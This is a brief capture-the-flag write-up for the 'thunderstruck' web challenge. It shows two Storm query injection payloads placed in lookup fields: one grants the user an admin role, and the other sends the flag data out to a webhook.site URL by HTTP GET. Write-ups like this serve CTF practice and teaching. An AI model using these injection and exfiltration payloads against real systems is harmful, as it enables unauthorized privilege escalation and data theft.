# thunderstruck (web)

Sign up with username test2, then lookup:

```
{auth:creds=(thunderstruck,test2) [+#role.admin]                                                                               }
```
(Note the spaces, needs to be 128 chars).

This gives you admin permissions, to see the `/admin` page. Here we see that the flag was imported as an `it:dev:str`

This is then exfiltrated with another lookup:

`{$x=$lib.str.concat(https://webhook.site/05fbedac-c57d-481e-8154-d03080ea9858?,{it:dev:str}) $lib.inet.http.get($x)            }`

Curly braces are for subquery injection in the storm queries used when doing lookups
